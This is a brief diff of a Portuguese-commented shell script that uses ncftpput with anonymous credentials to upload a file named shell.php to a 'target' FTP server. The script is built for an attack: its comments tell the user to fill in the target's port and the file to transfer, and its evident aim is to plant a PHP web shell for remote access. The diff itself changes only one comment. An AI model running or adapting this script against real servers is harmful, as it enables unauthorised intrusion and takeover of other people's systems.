@@ -7,7 +7,7 @@ password="anonymous"    #modifique senha
 port=21000  #modifique pela porta  FTP do seu alvo
 
 # Define o nome do arquivo a ser enviado
-file="shell.php"   #coloque o arquivo que vc queira transferir  
+file="shell.php"   #coloque o arquivo
 
 # Envia o arquivo usando o comando ncftp
 ncftpput -P "$port" -u "$username" -p "$password" "$server" /PATH/  "$file"
